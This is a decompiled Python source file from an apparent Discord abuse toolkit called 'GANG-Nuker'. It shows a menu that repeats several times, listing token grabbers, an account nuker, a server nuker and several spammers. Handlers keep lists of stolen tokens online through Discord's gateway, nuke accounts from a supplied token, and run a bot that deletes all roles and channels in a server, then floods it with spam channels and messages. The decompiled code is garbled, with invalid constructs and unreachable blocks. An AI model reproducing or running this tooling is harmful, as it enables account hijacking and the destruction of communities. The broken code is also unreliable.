'][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          ']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']
    if choice == '4':
        Spinner()
        
        class Onliner:
            __qualname__ = 'spammer.<locals>.Onliner'
            
            def __init__(self = None, token = None):
                self.token = token
                self.statuses = [
                    'idle',
                    'dnd']

            
            def __online__(self):
                ws = websocket.WebSocket()
                ws.connect('wss://gateway.discord.gg/?encoding=json&v=9')
                response = ws.recv()
                event = json.loads(response)
                heartbeat_interval = int(event['d']['heartbeat_interval']) / 1000
                ws.send(json.dumps({
                    'op': 2,
                    'd': {
                        'token': self.token,
                        'properties': {
                            '$os': sys.platform,
                            '$browser': 'RTB',
                            '$device': f'''{sys.platform} Device''' },
                        'presence': {
                            'game': {
                                'name': [],
                                'type': 0,
                                'details': [],
                                'state': [] },
                            'status': random.choice(self.statuses),
                            'since': 0,
                            'activities': [],
                            'afk': False } },
                    's': None,
                    't': None }))
                print(f'''[{g}+{w}] Online | {self.token[:63]}*********''')
                heartbeatJSON = {
                    'op': 1,
                    'token': self.token,
                    'd': 'null' }
                ws.send(json.dumps(heartbeatJSON))
                time.sleep(heartbeat_interval)
                continue


        for None in open('./tokens.txt', 'r').read().splitlines():
            token = None
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        exit = clear()
        exit = spammer()
    if choice == '5':
        Spinner()
        print(f'''\n[{lr}!{w}] Token Grabber is Currently Down... Updating Soon!''')
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        clear()
        exit = spammer()
    if choice == '6':
        Spinner()
        print(f'''\n[{lr}!{w}] Server MassDM is Currently Down... Updating Soon!''')
        time.sleep(2)
        exit = input('[\x1b[95m>\x1b[95m\x1b[37m] Press ENTER: ')
        clear()
        exit = spammer()
    if choice == '7':
        Spinner()
        token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Account Token: ')
        validateToken(token)
        Server_Name = str(input('[\x1b[95m>\x1b[95m\x1b[37m] Server Name?: '))
        message_Content = str(input('[\x1b[95m>\x1b[95m\x1b[37m] Friend MassDM Message?: '))
        if threading.active_count() < threads:
            threading.Thread(utilities.Plugins.Account_Nuker.GANGNUKER_START, (token, Server_Name, message_Content), **('target', 'args')).start()
    if choice == '8':
        Spinner()
        
        def menu():
            token = input('\n[\x1b[95m>\x1b[95m\x1b[37m] Bot token : ')
            f = open('data/ignore/.token', 'w')
            f.write(token)
            f.close()
            prefix = input('[\x1b[95m>\x1b[95m\x1b[37m] Bot prefix : ')
            f = open('data/ignore/.prefix', 'w')
            f.write(prefix)
            f.close()
            spammessage = input('[\x1b[95m>\x1b[95m\x1b[37m] Spam message : ')
            f = open('data/ignore/.message', 'w')
            f.write(spammessage)
            f.close()
            channelsname = input('[\x1b[95m>\x1b[95m\x1b[37m] Channels name : ')
            f = open('data/ignore/.channelsname', 'w')
            channelsname = channelsname.lower()
            channelsname.replace('', '-')
            f.write(channelsname)
            f.close()
            main()

        
        def main():
            prefix = open('data/ignore/.prefix', 'r')
            prefix = prefix.read()
            token = open('data/ignore/.token', 'r')
            token = token.read()
            channelsname = open('data/ignore/.channelsname', 'r')
            channelsname = channelsname.read()
            spammessage = open('data/ignore/.message', 'r')
            spammessage = spammessage.read()
            gang = commands.Bot(prefix, discord.Intents().all(), **('command_prefix', 'intents'))
            gang.remove_command('help')
            
            async def on_ready():
                if len(gang.guilds) > 1:
                    guildpl = 'guilds'
                else:
                    guildpl = 'guild'
                activity = discord.Game('GANG-Nuker Server Nuker', 3, **('name', 'type'))
                await gang.change_presence(discord.Status.dnd, activity, **('status', 'activity'))
                clear()
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Bot : {gang.user} ({len(gang.guilds)} {guildpl})''')
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Prefix : {prefix}''')
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Spam message : {spammessage}''')
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Channels name : {channelsname}''')
                print(f'''''')
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] type: {prefix}nuke in a channel''')
                print(f'''''')

            on_ready = None(on_ready)
            
            async def on_guild_channel_create(channel = None):
                await channel.send(spammessage)
                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Sent : {spammessage}''')
                continue

            on_guild_channel_create = None(on_guild_channel_create)
            
            async def on_guild_join(guild):
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        await channel.create_invite()
                        invite = <NODE:28>
                    
                    print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Joined Guild : {guild.name} ({guild.id}) {invite}''')
                    return None

            on_guild_join = gang.event(on_guild_join)
            
            async def nuke(ctx = None):
                await ctx.message.delete()
                print(f'''[\x1b[95m>\x1b[95m\x1b[37m] Nuking {ctx.guild.name} ({ctx.guild.id})...''')
                await ctx.guild.edit('GANG-Nuker Runs Discord', **('name',))
                for role in ctx.guild.roles:
                    
                    try:
                        await role.delete()
                        print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: @{role.name}''')
                    finally:
                        continue
                        print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: @{role.name}''')
                        continue
                        for channel in ctx.guild.channels:
                            
                            try:
                                await channel.delete()
                                print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Deleted: #{channel.name}''')
                            finally:
                                continue
                                print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Couldnt Delete: #{channel.name}''')
                                continue
                                
                                try:
                                    for i in range(50):
                                        await ctx.guild.create_text_channel(channelsname)
                                        print(f'''[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Created: #{channel.name}''')
                                finally:
                                    return None
                                    Exception
                                    er = None
                                    
                                    try:
                                        print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error: {er}''')
                                    finally:
                                        er = None
                                        del er
                                        return None
                                        er = None
                                        del er





            nuke = None(nuke)
            
            try:
                gang.run(token)
            finally:
                return None
                Exception
                er = None
                
                try:
                    print(f'''[{Fore.LIGHTRED_EX}!{Fore.RESET}] Error''')
                    input()
                finally:
                    er = None
                    del er
                    return None
                    er = None
                    del er



        menu()
        continue
    if choice == '9':
        Spinner()
        print(f'''\n{Fore.LIGHTRED_EX}[!]{Fore.RESET} Make Sure Your Tokens Are In Token.txt For Spammer To Work!\n''')
        tokens = open('tokens.txt', 'r').read().splitlines()
        server = input('[\x1b[95m>\x1b[95m\x1b[37m] Server ID: ')
